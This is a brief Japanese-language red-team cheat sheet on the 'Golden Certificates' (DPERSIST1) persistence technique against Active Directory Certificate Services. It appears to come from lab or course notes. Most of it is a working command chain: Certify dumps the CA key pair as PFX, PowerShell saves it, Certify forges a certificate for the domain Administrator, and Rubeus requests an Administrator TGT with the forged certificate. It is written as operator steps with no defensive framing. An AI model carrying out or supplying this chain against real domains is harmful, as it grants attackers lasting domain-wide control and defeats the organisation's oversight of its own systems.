# Golden Certificates
DPERSIST1 は、CA サーバーへの特権アクセスをドメイン全体にわたる無制限の特権アクセスに拡張するために使用される永続化技術

CA サーバーが侵害された場合、攻撃者は証明書の署名と発行に使用される公開鍵と秘密鍵を抽出できます。これらを使用してオフラインで証明書を偽造し、有効な鍵で署名することができます。

CertifyでPFXフォーマットのキーペアをダンプ
```
execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe manage-self --dump-certs --quiet
```

証明書を復号して攻撃者のデスクトップに置いておくと便利
```
[IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\contoso-root-ca.pfx", [Convert]::FromBase64String("PFX"))
```

いつでも好きな時に証明書を偽造可能

デフォルトのドメイン管理者用の証明書を偽造する例
```
C:\Tools\Certify\Certify\bin\Release\Certify.exe forge --ca-cert .\Desktop\contoso-root-ca.pfx --quiet --upn Administrator --subject CN=Administrator,CN=Users,DC=contoso,DC=com --sid S-1-5-21-3926355307-1661546229-813047887-500 --crl ldap:///CN=CONTOSO Root CA,CN=lon-cs-1,CN=CDP,CN=Public Key Services,CN=Services,CN=Configuration,DC=CONTOSO,DC=com
```

AdministratorのTGTを取得
```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:Administrator /domain:CONTOSO /certificate:[FORGED CERT] /enctype:aes256 /nowrap
```